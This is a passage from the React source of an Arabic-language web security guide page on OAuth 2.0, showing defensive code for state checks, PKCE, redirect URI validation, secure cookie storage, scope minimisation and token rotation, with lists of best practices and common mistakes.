  const authUrl = 'https://github.com/login/oauth/authorize?' +
    'client_id=' + GITHUB_CLIENT_ID + '&' +
    'redirect_uri=' + encodeURIComponent('https://app.com/callback') + '&' +
    'scope=read:user&' +
    'state=' + state;
  
  res.redirect(authUrl);
});

// عند العودة من Authorization Server
app.get('/callback', (req, res) => {
  const { code, state } = req.query;
  
  // التحقق من state
  if (!state || state !== req.session.oauthState) {
    return res.status(403).json({ 
      error: 'Invalid state parameter - possible CSRF attack' 
    });
  }
  
  // حذف state بعد الاستخدام (use once)
  delete req.session.oauthState;
  
  // ... بقية الكود
});`}
                </code>
              </pre>
            </div>

            {/* PKCE */}
            <div className="bg-gray-800 rounded-xl p-6 border border-gray-700">
              <h3 className="text-xl font-bold text-green-400 mb-3">2. استخدام PKCE (حماية Code Interception)</h3>
              <pre className="bg-gray-900 rounded-lg p-4 text-sm font-mono overflow-x-auto">
                <code>
{`// ✅ PKCE (Proof Key for Code Exchange)
import crypto from 'crypto';

function generatePKCE() {
  // إنشاء code_verifier (43-128 حرف)
  const codeVerifier = crypto.randomBytes(32)
    .toString('base64url');
  
  // إنشاء code_challenge باستخدام SHA-256
  const codeChallenge = crypto.createHash('sha256')
    .update(codeVerifier)
    .digest('base64url');
  
  return { codeVerifier, codeChallenge };
}

// عند بدء التفويض
app.get('/auth/google', (req, res) => {
  const { codeVerifier, codeChallenge } = generatePKCE();
  
  // حفظ code_verifier
  req.session.codeVerifier = codeVerifier;
  
  const authUrl = 'https://accounts.google.com/o/oauth2/v2/auth?' +
    'client_id=' + GOOGLE_CLIENT_ID + '&' +
    'redirect_uri=' + encodeURIComponent('https://app.com/callback') + '&' +
    'response_type=code&' +
    'scope=openid%20email&' +
    'code_challenge=' + codeChallenge + '&' +
    'code_challenge_method=S256';
  
  res.redirect(authUrl);
});

// عند تبادل الـ code
app.get('/callback', async (req, res) => {
  const { code } = req.query;
  const codeVerifier = req.session.codeVerifier;
  
  const tokenResponse = await fetch('https://oauth2.googleapis.com/token', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({
      grant_type: 'authorization_code',
      code: code,
      client_id: GOOGLE_CLIENT_ID,
      client_secret: GOOGLE_CLIENT_SECRET,
      redirect_uri: 'https://app.com/callback',
      code_verifier: codeVerifier,  // إرسال الـ verifier
    }),
  });
  
  delete req.session.codeVerifier;
  // ...
});`}
                </code>
              </pre>
            </div>

            {/* Redirect URI Validation */}
            <div className="bg-gray-800 rounded-xl p-6 border border-gray-700">
              <h3 className="text-xl font-bold text-green-400 mb-3">3. التحقق الصارم من Redirect URI</h3>
              <pre className="bg-gray-900 rounded-lg p-4 text-sm font-mono overflow-x-auto">
                <code>
{`// ✅ تحقق صارم من redirect_uri

// على Authorization Server
const ALLOWED_REDIRECT_URIS = {
  'myapp': [
    'https://app.example.com/callback',
    'https://app.example.com/auth/callback',
  ],
  'mobile': [
    'myapp://callback',  // Deep link للتطبيق
  ],
};

function validateRedirectUri(clientId, redirectUri) {
  const allowed = ALLOWED_REDIRECT_URIS[clientId] || [];
  
  // تحقق دقيق (لا تطابق جزئي!)
  if (!allowed.includes(redirectUri)) {
    throw new Error('Invalid redirect_uri');
  }
  
  // تحقق من البروتوكول
  const url = new URL(redirectUri);
  if (url.protocol !== 'https:' && url.protocol !== 'myapp:') {
    throw new Error('Only HTTPS or custom scheme allowed');
  }
  
  return true;
}

// على Client (الخادم)
// ✅ تحقق من redirect_uri في الطلب الأصلي
app.get('/auth/github', (req, res) => {
  const callbackUrl = 'https://app.com/callback'; // ثابت
  
  const authUrl = 'https://github.com/login/oauth/authorize?' +
    'client_id=' + GITHUB_CLIENT_ID + '&' +
    'redirect_uri=' + encodeURIComponent(callbackUrl) + '&' +
    'scope=read:user';
  
  res.redirect(authUrl);
});`}
                </code>
              </pre>
            </div>

            {/* Token Storage */}
            <div className="bg-gray-800 rounded-xl p-6 border border-gray-700">
              <h3 className="text-xl font-bold text-green-400 mb-3">4. التخزين الآمن للتوقيعات</h3>
              <pre className="bg-gray-900 rounded-lg p-4 text-sm font-mono overflow-x-auto">
                <code>
{`// ✅ تخزين آمن للتوقيعات

// في Next.js مع Cookies
import { cookies } from 'next/headers';

// تعيين access token
cookies().set('access_token', token, {
  httpOnly: true,      // لا يمكن الوصول من JavaScript
  secure: true,        // HTTPS فقط
  sameSite: 'strict',  // حماية CSRF
  maxAge: 3600,        // ساعة واحدة
  path: '/',
});

// تعيين refresh token (عمر أطول)
cookies().set('refresh_token', refreshToken, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  maxAge: 30 * 24 * 60 * 60, // 30 يوم
  path: '/api/auth',  // endpoint محدد
});

// ❌ أخطاء شائعة
localStorage.setItem('access_token', token);     // XSS!
sessionStorage.setItem('token', token);          // XSS!
document.cookie = 'token=' + token;              // بدون HttpOnly!

// ✅ في middleware التحقق
async function verifyToken(req) {
  const token = cookies().get('access_token')?.value;
  
  if (!token) {
    return NextResponse.redirect(new URL('/login', req.url));
  }
  
  try {
    const decoded = await verifyJWT(token);
    req.user = decoded;
    return NextResponse.next();
  } catch (err) {
    cookies().delete('access_token');
    return NextResponse.redirect(new URL('/login', req.url));
  }
}`}
                </code>
              </pre>
            </div>

            {/* Scope Minimization */}
            <div className="bg-gray-800 rounded-xl p-6 border border-gray-700">
              <h3 className="text-xl font-bold text-green-400 mb-3">5. تقليل الصلاحيات (Scope Minimization)</h3>
              <pre className="bg-gray-900 rounded-lg p-4 text-sm font-mono overflow-x-auto">
                <code>
{`// ✅ طلب الحد الأدنى من الصلاحيات

// ❌ صلاحيات واسعة غير مبررة
const scope = 'read write delete admin';

// ✅ صلاحيات محددة ومضبوطة
const scope = 'read:user'; // قراءة بيانات المستخدم فقط

// ✅ على Authorization Server: التحقق من Scope
function validateScope(clientId, requestedScope) {
  const clientConfig = CLIENT_CONFIGS[clientId];
  const allowedScopes = clientConfig.allowedScopes;
  
  const requested = requestedScope.split(' ');
  const invalid = requested.filter(s => !allowedScopes.includes(s));
  
  if (invalid.length > 0) {
    throw new Error(\`Invalid scopes: \${invalid.join(', ')}\`);
  }
  
  return requestedScope;
}

// ✅ على Resource Server: التحقق من الصلاحيات
app.get('/api/user/profile', (req, res) => {
  const token = req.headers.authorization?.split(' ')[1];
  const decoded = verifyToken(token);
  
  // التحقق من scope
  if (!decoded.scope.includes('read:user')) {
    return res.status(403).json({ error: 'Insufficient scope' });
  }
  
  // فقط قراءة البيانات
  res.json({ user: req.user });
});`}
                </code>
              </pre>
            </div>

            {/* Token Revocation */}
            <div className="bg-gray-800 rounded-xl p-6 border border-gray-700">
              <h3 className="text-xl font-bold text-green-400 mb-3">6. إلغاء التوقيعات وتبديل Refresh Token</h3>
              <pre className="bg-gray-900 rounded-lg p-4 text-sm font-mono overflow-x-auto">
                <code>
{`// ✅ إلغاء التوقيعات وتبديل Refresh Token

// 1. Token Revocation Endpoint
app.post('/api/auth/revoke', async (req, res) => {
  const { token } = req.body;
  
  // حفظ التوقيع المُلغي في blacklist
  await redis.set(\`revoked:\${token}\`, '1', 'EX', 3600);
  
  // إذا كان refresh token، إلغاء جميع التوقيعات المرتبطة
  const userId = await getUserIdFromRefreshToken(token);
  await revokeAllUserTokens(userId);
  
  res.json({ success: true });
});

// 2. Refresh Token Rotation
app.post('/api/auth/refresh', async (req, res) => {
  const { refreshToken } = req.body;
  
  // التحقق من أن الـ refresh token غير مُلغى
  if (await isTokenRevoked(refreshToken)) {
    return res.status(401).json({ error: 'Token revoked' });
  }
  
  // التحقق من family token (كشف reuse)
  const familyId = await getRefreshTokenFamily(refreshToken);
  if (await isTokenFamilyCompromised(familyId)) {
    // تم استخدام refresh token قديم = اختراق!
    await revokeAllUserTokens(userId);
    return res.status(401).json({ error: 'Token reuse detected' });
  }
  
  // إلغاء الـ refresh token القديم
  await revokeRefreshToken(refreshToken);
  
  // إنشاء refresh token جديد
  const newRefreshToken = generateRefreshToken();
  await saveRefreshToken(newRefreshToken, familyId, userId);
  
  // إنشاء access token جديد
  const newAccessToken = generateAccessToken(userId);
  
  res.json({
    access_token: newAccessToken,
    refresh_token: newRefreshToken,
    expires_in: 3600,
  });
});

// 3. تسجيل الخروج
app.post('/api/auth/logout', async (req, res) => {
  const userId = req.user.id;
  
  // إلغاء جميع التوقيعات
  await revokeAllUserTokens(userId);
  
  // حذف الكوكيز
  cookies().delete('access_token');
  cookies().delete('refresh_token');
  
  res.json({ success: true });
});`}
                </code>
              </pre>
            </div>
          </div>
        </section>

        {/* Tips */}
        <section id="tips" className="mb-12">
          <h2 className="text-2xl font-bold text-emerald-300 mb-6 border-b border-emerald-700 pb-2">
            7. نصائح وأخطاء شائعة
          </h2>

          <div className="grid md:grid-cols-2 gap-6">
            <div className="bg-green-900/20 rounded-xl p-6 border border-green-700">
              <h3 className="font-bold text-green-300 mb-4 text-lg">أفضل الممارسات</h3>
              <ul className="space-y-3 text-sm text-gray-300">
                <li className="flex items-start gap-2">
                  <span className="text-green-400">✓</span>
                  استخدام Authorization Code Flow مع PKCE دائماً
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-green-400">✓</span>
                  إلزام استخدام state parameter في جميع التدفقات
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-green-400">✓</span>
                  التحقق الصارم من redirect_uri (تطابق كامل)
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-green-400">✓</span>
                  طلب الحد الأدنى من الصلاحيات (Least Privilege)
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-green-400">✓</span>
                  تخزين التوقيعات في HttpOnly Secure Cookies
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-green-400">✓</span>
                  تطبيق Refresh Token Rotation
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-green-400">✓</span>
                  استخدام HTTPS في جميع الاتصالات
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-green-400">✓</span>
                  تسجيل جميع أحداث التفويض الأمنية
                </li>
              </ul>
            </div>

            <div className="bg-red-900/20 rounded-xl p-6 border border-red-700">
              <h3 className="font-bold text-red-300 mb-4 text-lg">أخطاء شائعة</h3>
              <ul className="space-y-3 text-sm text-gray-300">
                <li className="flex items-start gap-2">
                  <span className="text-red-400">✗</span>
                  استخدام Implicit Flow في تطبيقات الويب
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-red-400">✗</span>
                  عدم استخدام state parameter (CSRF ممكن)
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-red-400">✗</span>
                  تخزين التوقيعات في localStorage
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-red-400">✗</span>
                  قبول redirect_uri بتطابق جزئي
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-red-400">✗</span>
                  عدم استخدام PKCE في التطبيقات العامة
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-red-400">✗</span>
                  طلب صلاحيات أوسع من اللازم
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-red-400">✗</span>
                  عدم تطبيق Refresh Token Rotation
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-red-400">✗</span>
                  عدم إلغاء التوقيعات عند تسجيل الخروج
                </li>
              </ul>
            </div>
          </div>

          <div className="bg-blue-900/20 rounded-xl p-6 mt-6 border border-blue-700">
            <h3 className="font-bold text-blue-300 mb-3">مكتبات OAuth الموصى بها</h3>
            <div className="grid md:grid-cols-3 gap-4 text-sm">
              <div className="bg-gray-800 rounded-lg p-4">
                <h4 className="font-bold text-purple-300">Node.js</h4>
                <ul className="text-gray-300 mt-2 space-y-1">
                  <li>• passport.js</li>
                  <li>• next-auth</li>
                  <li>• oidc-client-ts</li>
                  <li>• oauth4webapi</li>
                </ul>
              </div>
              <div className="bg-gray-800 rounded-lg p-4">
                <h4 className="font-bold text-purple-300">Python</h4>
                <ul className="text-gray-300 mt-2 space-y-1">
                  <li>• Authlib</li>
                  <li>• python-social-auth</li>
                  <li>• authlib</li>
                </ul>
              </div>
              <div className="bg-gray-800 rounded-lg p-4">
                <h4 className="font-bold text-purple-300">PHP</h4>
                <ul className="text-gray-300 mt-2 space-y-1">
                  <li>• league/oauth2-client</li>
                  <li>• jumbojett/OpenID-Connect-PHP</li>
                </ul>
              </div>
            </div>
          </div>
        </section>

        <LabsSection slug="oauth" />
        <ToolsSection slug="oauth" />
        <Quiz slug="oauth" />
        <VideoSection slug="oauth" />

        {/* Navigation */}
        <section id="navigation" className="mb-12">
          <h2 className="text-2xl font-bold text-emerald-300 mb-6 border-b border-emerald-700 pb-2">
            8. روابط التنقل
          </h2>

          <div className="grid md:grid-cols-2 gap-4">
            <Link
              href="/"
              className="bg-gray-800 hover:bg-gray-750 rounded-xl p-4 border border-gray-700 hover:border-emerald-600 transition-colors block"
            >
              <h3 className="font-bold text-emerald-300">الرئيسية</h3>
              <p className="text-sm text-gray-400 mt-1">العودة لصفحة الدليل الرئيسية</p>
            </Link>

            <Link
              href="/vulnerabilities"
              className="bg-gray-800 hover:bg-gray-750 rounded-xl p-4 border border-gray-700 hover:border-emerald-600 transition-colors block"
            >
              <h3 className="font-bold text-emerald-300">قائمة الثغرات</h3>
              <p className="text-sm text-gray-400 mt-1">عرض جميع ثغرات أمن الويب</p>
            </Link>

            <Link
              href="/vulnerabilities/jwt"
              className="bg-gray-800 hover:bg-gray-750 rounded-xl p-4 border border-gray-700 hover:border-emerald-600 transition-colors block"
            >
              <h3 className="font-bold text-emerald-300">ثغرات JWT</h3>
              <p className="text-sm text-gray-400 mt-1">JSON Web Token Vulnerabilities</p>
            </Link>

            <Link
              href="/vulnerabilities/csrf"
              className="bg-gray-800 hover:bg-gray-750 rounded-xl p-4 border border-gray-700 hover:border-emerald-600 transition-colors block"
            >
              <h3 className="font-bold text-emerald-300">ثغرات CSRF</h3>
              <p className="text-sm text-gray-400 mt-1">Cross-Site Request Forgery</p>
            </Link>

            <Link
              href="/vulnerabilities/open-redirect"
              className="bg-gray-800 hover:bg-gray-750 rounded-xl p-4 border border-gray-700 hover:border-emerald-600 transition-colors block"
            >
              <h3 className="font-bold text-emerald-300">ثغرات Open Redirect</h3>
              <p className="text-sm text-gray-400 mt-1">التوجيه المفتوح</p>
            </Link>

            <Link
              href="/vulnerabilities/xss"
              className="bg-gray-800 hover:bg-gray-750 rounded-xl p-4 border border-gray-700 hover:border-emerald-600 transition-colors block"
            >
              <h3 className="font-bold text-emerald-300">ثغرات XSS</h3>
              <p className="text-sm text-gray-400 mt-1">Cross-Site Scripting</p>
            </Link>
          </div>
        </section>

        {/* References */}
        <section className="bg-gray-800 rounded-xl p-6 border border-gray-700">
          <h2 className="text-xl font-bold text-emerald-300 mb-4">مراجع ومصادر</h2>
          <ul className="space-y-2 text-sm text-gray-300">
            <li>• <a href="https://oauth.net/2/" target="_blank" className="text-blue-400 hover:underline">oauth.net</a> - الموقع الرسمي لـ OAuth 2.0</li>
            <li>• <a href="https://datatracker.ietf.org/doc/html/rfc6749" target="_blank" className="text-blue-400 hover:underline">RFC 6749</a> - OAuth 2.0 Framework</li>
            <li>• <a href="https://datatracker.ietf.org/doc/html/rfc7636" target="_blank" className="text-blue-400 hover:underline">RFC 7636</a> - PKCE Specification</li>
            <li>• <a href="https://datatracker.ietf.org/doc/html/draft-ietf-oauth-browser-based-apps" target="_blank" className="text-blue-400 hover:underline">OAuth for Browser-Based Apps</a></li>
            <li>• <a href="https://portswigger.net/web-security/oauth" target="_blank" className="text-blue-400 hover:underline">PortSwigger</a> - أكاديمية OAuth Security</li>
            <li>• <a href="https://cheatsheetseries.owasp.org/cheatsheets/OAuth_Cheat_Sheet.html" target="_blank" className="text-blue-400 hover:underline">OWASP OAuth Cheat Sheet</a></li>
            <li>• <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_OAuth_Weaknesses" target="_blank" className="text-blue-400 hover:underline">OWASP Testing Guide - OAuth</a></li>
          </ul>
        </section>
      </main>

      {/* Footer */}
      <footer className="bg-gray-800 border-t border-gray-700 py-8">
        <div className="container mx-auto px-4 text-center text-gray-400 text-sm">
          <p>دليل أمن الويب الشامل - جميع الحقوق محفوظة</p>
        </div>
      </footer>
    </div>
  );
}
